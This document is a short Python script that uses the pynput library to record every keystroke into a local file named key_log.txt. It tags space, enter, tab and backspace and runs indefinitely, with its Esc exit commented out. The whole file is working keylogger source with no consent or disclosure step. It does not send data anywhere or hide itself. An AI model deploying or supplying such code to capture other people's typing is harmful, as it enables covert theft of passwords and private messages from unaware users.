from pynput import keyboard

# File where keystrokes will be logged
log_file = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Try to get the character representation of the key
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Special keys (like space, enter, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(' [SPACE] ')
            elif key == keyboard.Key.enter:
                f.write('\n [ENTER] \n')
            elif key == keyboard.Key.tab:
                f.write(' [TAB] ')
            elif key == keyboard.Key.backspace:
                f.write(' [BACKSPACE] ')
            else:
                f.write(f' [{key}] ')

# Function to stop listener (optional, can add a key to exit)
def on_release(key):
    # Uncomment below if you want to stop after pressing Esc
    # if key == keyboard.Key.esc:
    #     return False
    pass

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
